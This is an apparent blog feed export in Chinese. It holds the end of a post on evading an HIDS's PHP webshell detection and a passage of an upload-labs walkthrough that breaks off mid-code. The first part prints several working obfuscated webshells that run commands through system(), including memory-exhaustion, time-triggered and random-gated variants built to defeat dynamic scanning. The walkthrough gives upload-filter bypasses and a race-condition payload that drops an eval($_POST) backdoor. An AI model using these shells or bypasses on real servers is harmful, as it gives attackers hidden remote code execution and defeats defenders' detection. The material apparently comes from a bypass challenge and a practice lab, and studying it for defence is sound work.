class="line">&#125; </span><br><span class="line">echo $m($cur-&gt;getMessage()); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>用SplPriorityQueue 这个类 new了一个对象</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165347214.png" alt="image-20250804165347214"></p><p>这个类中有优先级队列的一些方法</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165424317.png" alt="image-20250804165424317"></p><p>这个</p><p>$objPQ-&gt;insert(‘m’,1); </p><p>我们可以看到官方文档说明他有两个参数，第一个就是要进行排序的值，第二个就是优先级，优先级越大，他排在最上面</p><p>这里他就是想构造 system 只需要我们将a传入3就行</p><p>然后他下面用了   setExtractFlags  这个方法 调用了 SplPriorityQueue::EXTR_DATA 这个常量</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165923460.png"></p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804170014276.png" alt="image-20250804170014276"></p><p>也就是他想用 setExtractFlags 来提取优先级队列里面的数据</p><p>也就是提取system</p><p>然后他又调用了top这个方法</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804170153471.png" alt="image-20250804170153471"></p><p>让他从顶部开始查看节点</p><p>$cur &#x3D; new ErrorException($_GET[b]);</p><p>这里他又用了这个抛出错误这个类创建一个对象，然后通过getmessage()这个方法来传入我们的命令</p><p>然后下面那个循环</p><p>他先调用了valid ，来检查队列是否有多个节点，返回类型bool型，满足条件</p><p>然后又用 current来指向当前的节点 因为前面调用了top 所以从上往下指</p><p>然后next 依次往下指，取出了我们的system ，在进行了拼接命令执行函数</p><p>测试</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804171233692.png" alt="image-20250804171233692"></p><p>成功执行</p><h3 id="0x0E-内存不足"><a href="#0x0E-内存不足" class="headerlink" title="0x0E 内存不足"></a>0x0E 内存不足</h3><p>内存不足的思想是：查杀引擎的动态执行需要消耗内存空间，由于同一时间处理的样本 很多，因此单独给每个沙箱环境分配的内存往往不会太多，如果我构造一个样本，能够让查 杀引擎由于内存不足提前终止查杀，而在真实环境中内存可以满足执行需要，就能够执行到 恶意的代码了，恰好PHP的内存申请是可以通过php_ini在运行时动态修改的。  请看样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line"> </span><br><span class="line">class b extends SplObjectStorage &#123; </span><br><span class="line">    public function getHash($o) &#123; </span><br><span class="line">        return get_class($o); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">$cur= new  DomainException($_GET[a]); </span><br><span class="line">?&gt; </span><br><span class="line">    111111111111111111111111111111111111111111111111 </span><br><span class="line"> </span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">ini_set(&quot;memory_limit&quot;,&quot;100G&quot;); </span><br><span class="line">echo memory_get_usage().&#x27;&lt;br&gt;&#x27;; </span><br><span class="line">$var = str_repeat(&quot;php7_do9gy&quot;, 100000000); </span><br><span class="line">echo memory_get_usage(); </span><br><span class="line">class bb&#123;&#125;</span><br><span class="line">?&gt; </span><br><span class="line">    111111111111111111111111111111111111111111111111 </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">class A &#123;&#125; </span><br><span class="line"> </span><br><span class="line">$s = new b; </span><br><span class="line"> </span><br><span class="line">$o2 = new stdClass; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$s[$o2] = &#x27;system&#x27;; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//these are considered equal to the objects before </span><br><span class="line">//so they can be used to access the values stored under them </span><br><span class="line">$p1 = new stdClass; </span><br><span class="line">echo $s[$p1]($cur-&gt;getMessage()); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>分析</p><p>第一段php代码：</p><p>他先定义了一个b类继承了SplObjectStorage类的属性和方法，重写了getHash这个方法</p><p>让他返回对象名</p><p>然后</p><p>他又new了一个对象通过DomainException这个类，也是一个抛出异常的一个类，$_GET[a]应该就是我们执行的参数，通过getmessage来获取</p><p>第二段php代码：</p><p>他初始化了一个 memory_limit  分配了100g的内存</p><p>然后他打印了一下这个 内存量，然后他又用str_repeat这个函数 一直重复的赋值 php7_do9gy这个字符串</p><p>100000000次</p><p>然后他又打印了一下</p><p>并定义了一个空的类bb</p><p>第三段php代码：</p><p>首先定义了一个空A类</p><p>然后通过b类new了一个$s这个对象，</p><p>又通过stdClass这个类 new 了一个o2的对象</p><p>然后他将$s[$o2] &#x3D; ‘system’; </p><p>然后又用 stdClass 这个类new了一个p1的对象</p><p>最后进行拼接打印输出</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804173630947.png" alt="image-20250804173630947"></p><p>可以看到最开始内存占用是 403984  变成了1000405544 </p><p>成功</p><h3 id="0x0F-未来WebShell"><a href="#0x0F-未来WebShell" class="headerlink" title="0x0F 未来WebShell"></a>0x0F 未来WebShell</h3><p>思路：动态查杀是基于PHP 文件上传后动态执行的，那么有没有可能上传一个文件， 上传时它还不是WebShell，它自己过几分钟变成一个 WebShell呢？这样在上传时就可以躲 过动态查杀。正好，结合0x05和0x06两种模式，我们尽可能将是否为WebShell的判断依 据前置到一个if条件中，然后让这个条件以当前时间为依据，那么上传时的Unix时间戳小 于某个值，返回结果True，动态引擎自然判定这是一个正常的文件，而过一段时间，时间变 化了返回结果变为了False，再去请求这个WebShell 自然就能够执行了。  一直想构造这样一个未来的webshell，但是由于网站对时间相关的函数过滤很严，直到我发 现了DateTime类的getTimestamp方法。  仅有这个思路是不够的，在实现时，还结合了反射的技巧以及PHP条件优化。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">function foo($test, $bar = FSYSTEM) </span><br><span class="line">&#123; </span><br><span class="line">    echo $test . $bar; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;foo&#x27;); </span><br><span class="line">$q = new ParseError($_GET[a]); </span><br><span class="line">foreach ($function-&gt;getParameters() as $param) &#123; </span><br><span class="line">    $da = new DateTime(); </span><br><span class="line"> </span><br><span class="line">    echo $da-&gt;getTimestamp(); </span><br><span class="line">    echo &#x27;Name: &#x27; . $param-&gt;getName() . PHP_EOL; </span><br><span class="line">    $n=&#x27;F&#x27;; </span><br><span class="line">    if ($param-&gt;isOptional()) &#123; </span><br><span class="line">        if($da-&gt;getTimestamp()&gt;=1648470471||$n=&#x27;1&#x27;)&#123; </span><br><span class="line">            echo $n; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        echo &#x27;Default value: &#x27; . </span><br><span class="line">ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </span><br><span class="line">    &#125; </span><br><span class="line">    echo PHP_EOL; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>分析</p><p>他先定义了一个foo的函数里面有两个参数，test没有默认值，需要用户传入，bar有默认值，用户可传可不传</p><p>然后 通过ReflectionFunction这个类创建了一个function这个对象，这个类英文翻译为反射函数</p><p>我们可以知道，他将foo这个函数的属性给了$function </p><p>然后他又通过了 ParseError这个类抛出异常来接收我们要执行的命令</p><p>if判断里面用 getParameters 获取了一下$function 的参数，也就是获取到了 test，和bar</p><p>用这两个参数进行循环</p><p>循环里面，他用DateTime 这个类创建了一个对象 $da，然后用getTimestamp() 获取了一下unix时间戳并打印出来，然后 getName获取属性名赋值给$param， 然后将$n&#x3D;’F’; </p><p>进入下面的判断</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175239499.png" alt="image-20250804175239499"></p><p>isOptional() 调用这个方法来判断$param 里面的属性是否是可选的参数，也就是可以传值也可以不传值的参数</p><p>if($da-&gt;getTimestamp()&gt;&#x3D;1648470471||$n&#x3D;’1’)</p><p>这里这个判断 如果时间戳大于 就不$n&#x3D;’1’进行这个赋值  直接往下继续执行了，如果小于就将 $n&#x3D;’1’ 进行赋值</p><p>最后ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </p><p>调用这个来构造system()，这里他是通过getDefaultValueConstantName来获取默认的参数值，并交给ltrim进行清洗掉$n，也就是将FSYSTEM 中的F 去掉，就刚好是我们的system，如果这个$n是1 的话，它里面没有1 所以不做处理，会让waf认为是正常函数，污点就会断掉，只有在特定的时间才会触发</p><p>测试</p><p>这里我们修改一下这个时间戳为1754301527</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175826475.png" alt="image-20250804175826475"></p><p>等下时间到</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175852801.png" alt="image-20250804175852801"></p><p>成功执行</p><h3 id="0x10-量子WebShell"><a href="#0x10-量子WebShell" class="headerlink" title="0x10 量子WebShell"></a>0x10 量子WebShell</h3><p>不满足于未来WebShell的挖掘，我又找到了一种新的模式——量子WebShell。在PHP 引擎查杀时，利用随机数，让判断条件在大多数情况下都不成立，此时这个WebShell处于 是WebShell和非WebShell的叠加态，当且仅当参数传递缩小随机数生成范围以后，让条件 恒成立，此时该样本坍缩到一个WebShell的状态，可以稳定触发。  请看代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">function foo($test, $bar = FSYSTEM) </span><br><span class="line">&#123; </span><br><span class="line">    echo $test . $bar; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;foo&#x27;); </span><br><span class="line">$q = new ParseError($_GET[a]); </span><br><span class="line">$p = new ParseError($_SERVER[HTTP_A]); </span><br><span class="line">foreach ($function-&gt;getParameters() as $param) &#123; </span><br><span class="line">    $da = new DateTime(); </span><br><span class="line"> </span><br><span class="line">    echo $da-&gt;getTimestamp(); </span><br><span class="line">    echo &#x27;Name: &#x27; . $param-&gt;getName() . PHP_EOL; </span><br><span class="line">    $n=&#x27;F&#x27;; </span><br><span class="line">    if ($param-&gt;isOptional()) &#123; </span><br><span class="line">        if(mt_rand(55,$p-&gt;getMessage()??100)==55||$n=&#x27;1&#x27;)&#123; </span><br><span class="line">            echo $n; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        echo &#x27;Default value: &#x27; . </span><br><span class="line">ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </span><br><span class="line">    &#125; </span><br><span class="line">    echo PHP_EOL; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这里他跟前面列子不一样的地方就是判断的地方</p><p>前面还是一样用反射函数构建等等。。。</p><p>(mt_rand(55,$p-&gt;getMessage()??100)&#x3D;&#x3D;55||$n&#x3D;’1’)</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804180322020.png" alt="image-20250804180322020"></p><p>他通过mt_rand这个函数来随机取值，如果我们的$_SERVER[HTTP_A]没传值 getMessage()这个就接收不到参数</p><p>他的范围就(55，100), 这样经过mt_rand()很难精准的取到55，所以这里我们传值就传55，让他定死</p><p>$p &#x3D; new ParseError($_SERVER[HTTP_A]); </p><p>就伪造一个header头 HTTP_A:55</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804183338675.png" alt="image-20250804183338675"></p><p>这样他前面的条件一直成立，就不会重新赋值给$n,我们的$n就是F 就可以经过ltrim 清洗掉F ，构造出SYSTEM</p><p>测试</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804183353029.png" alt="image-20250804183353029"></p><p>成功执行</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;背景：2022年春天，参加了某HIDS Bypass挑战赛，赛题恰好是关于PHP WebShell绕 过的，结合Fuzz技术获得了几个侥幸可以绕过的样本，围绕#WebShell检测那些事的主题， 与各位做一个分享。 &lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="bypass" scheme="https://heisha123.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs 靶场</title>
    <link href="https://heisha123.github.io/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/"/>
    <id>https://heisha123.github.io/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/</id>
    <published>2025-07-28T12:47:16.000Z</published>
    <updated>2025-07-28T14:46:21.230Z</updated>
    
    <content type="html"><![CDATA[<p>练练文件上传</p> <span id="more"></span><h4 id="pass-01（前端验证）"><a href="#pass-01（前端验证）" class="headerlink" title="pass-01（前端验证）"></a>pass-01（前端验证）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728204908075.png" alt="image-20250728204908075"></p><p>前端判断了文件类型</p><p>可以直接利用bp拦截抓包改包</p><p>这里我们直接利用浏览器控制台让他这个函数直接返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkFile = function() &#123; return true; &#125;;</span><br></pre></td></tr></table></figure><p>控制台直接执行</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205240835.png" alt="image-20250728205240835"></p><p>直接上传php文件即可</p><h4 id="pass-02（MIME验证）"><a href="#pass-02（MIME验证）" class="headerlink" title="pass-02（MIME验证）"></a>pass-02（MIME验证）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205753347.png" alt="image-20250728205753347"></p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205833948.png" alt="image-20250728205833948"></p><p>这里只进行了文件类型的判断，用户可以通过改包的方式，用户可控</p><h4 id="pass-03（黑名单验证，特殊后缀）"><a href="#pass-03（黑名单验证，特殊后缀）" class="headerlink" title="pass-03（黑名单验证，特殊后缀）"></a>pass-03（黑名单验证，特殊后缀）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205329018.png" alt="image-20250728205329018"></p><p>黑名单。直接上传<code>.htaccess</code> 强制解析jpg文件，或者上传php3,php4,或者phtml，他这里应该是考后者</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205626972.png" alt="image-20250728205626972"></p><p>可以解析</p><h4 id="pass-04（黑名单验证，-htaccess）"><a href="#pass-04（黑名单验证，-htaccess）" class="headerlink" title="pass-04（黑名单验证，.htaccess）"></a>pass-04（黑名单验证，.htaccess）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728205936310.png" alt="image-20250728205936310"></p><p>还是黑名单，过滤了一堆</p><p>这里也没有过滤我们的<code>.htaccess</code> 可以进行解析jpg文件</p><p>但是这里他还有一个逻辑漏洞，可以绕过他这个过滤</p><p>他没有提前对我们上传的文件进行重命名操作，所以我们可以利用双重拓展名来绕过前面的一系列操作</p><p>类似于我们传<code>shell.php.jpg</code></p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728210846616.png" alt="image-20250728210846616"></p><h4 id="pass-05（大小写绕过）"><a href="#pass-05（大小写绕过）" class="headerlink" title="pass-05（大小写绕过）"></a>pass-05（大小写绕过）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211012033.png" alt="image-20250728211012033"></p><p>第一眼跟第四关没区别。看了下提示发现</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211153202.png" alt="image-20250728211153202"></p><p>禁用了我们的<code>.htaccess</code>  ,所以我们依然可以用双拓展名绕过</p><p>也可以上传<code>.user.ini</code>  解析我们上传的jpg</p><h4 id="pass-06（黑名单验证，-user-ini-）"><a href="#pass-06（黑名单验证，-user-ini-）" class="headerlink" title="pass-06（黑名单验证，.user.ini.）"></a>pass-06（黑名单验证，.user.ini.）<img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211347095.png" alt="image-20250728211347095"></h4><p>没看出来区别</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211533211.png" alt="image-20250728211533211"></p><p>他又放开了<code>.htaccess</code> </p><p>而且我们的双拓展名依旧可以绕过</p><h4 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h4><p> <img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211627548.png" alt="image-20250728211627548"></p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211645405.png" alt="image-20250728211645405"></p><p>依旧双拓展名绕过</p><h4 id="pass-08（黑名单验证，特殊字符-DATA绕过）"><a href="#pass-08（黑名单验证，特殊字符-DATA绕过）" class="headerlink" title="pass-08（黑名单验证，特殊字符::$DATA绕过）"></a>pass-08（黑名单验证，特殊字符::$DATA绕过）</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211714737.png" alt="image-20250728211714737"></p><p><code>shell.php::$DATA</code></p><p>依旧双拓展名绕过</p><h4 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211758766.png" alt="image-20250728211758766"></p><p>依旧双拓展名绕过</p><h4 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728211832976.png" alt="image-20250728211832976"></p><p>依旧双拓展名绕过</p><p>或者</p><p><code>shell.php::$DATA</code></p><h4 id="pass-11（-00截断）"><a href="#pass-11（-00截断）" class="headerlink" title="pass-11（%00截断）"></a>pass-11（%00截断）</h4><p>终于用上白名单了</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728213248089.png" alt="image-20250728213248089"></p><p>可以看到这里用户可以控制上传的路径</p><p>考虑用%00截断</p><p>因为在c语言的底层<code>/0</code> 代表终止 ，php的底层代码就是c语言，%00 urldecode 就是&#x2F;0 所以可以截断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?save_path=../upload/1.php%00 </span><br></pre></td></tr></table></figure><h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728213947630.png" alt="image-20250728213947630"></p><p>刚刚是get传参，这次是post，一样的道理</p><p>%00截断</p><p>post我们需要在十六进制里面去修改</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728214415328.png" alt="image-20250728214415328"></p><h4 id="pass-13-图片马"><a href="#pass-13-图片马" class="headerlink" title="pass-13 图片马"></a>pass-13 图片马</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728214449370.png" alt="image-20250728214449370"></p><p>图片马，加文件包含</p><p>直接上传即可</p><p>他这里取了前两个字节，我们要保证我们的图片马 开头是 .PNG. GIF89a  等</p><p>然后文件包含直接利用即可</p><h4 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728214822738.png" alt="image-20250728214822738"></p><p>一样的跟13关</p><h4 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728214913814.png" alt="image-20250728214913814"></p><p>我们的图片马经过了精心的处理。所以这个我们也可以直接上传</p><h4 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728215059818.png" alt="image-20250728215059818"></p><p>这里他把我们的图片经过了二次渲染后在进行判断。所以我们要保证我们的图片在二次渲染后php代码还存在</p><p>我们可以随便先上传一个图片</p><p>然后将上传的图片下载下来，用010editor 观察两张图片前后未变化的部分，然后在这部分插入我们的php代码</p><p>推荐用GIF图片</p><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/22-17537119060744.gif" alt="22"></p><h4 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h4><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728221203081.png" alt="image-20250728221203081"></p><p>代码处理流程</p><ul><li>移动文件到指定路径</li><li>判断文件后缀是否符合</li><li>符合则重命名</li><li>不符合则删除文件</li></ul><p>这里存在逻辑的问题，先移动文件到指定目录再判断是否符合并删除。服务器处理代码时总会存在一定的时间差，当我们在上传文件后就多次快速尝试访问目标文件，那么是不是有机会在删除前成功访问文件。而如果文件的代码是重新创建一个木马文件，新木马文件则永远不会被删除了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$webshell = &#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;;</span><br><span class="line">file_put_contents(&#x27;1.php&#x27;, $webshell);</span><br><span class="line">echo &quot;Webshell created as 1.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/image-20250728222022730.png" alt="image-20250728222022730"></p><h4 id="pass-18条件竞争-apache解析漏洞"><a href="#pass-18条件竞争-apache解析漏洞" class="headerlink" title="pass-18条件竞争+apache解析漏洞"></a>pass-18条件竞争+apache解析漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &#x27;上传失败，上传目录不可写。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &#x27;上传失败，上传的文件过大。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = 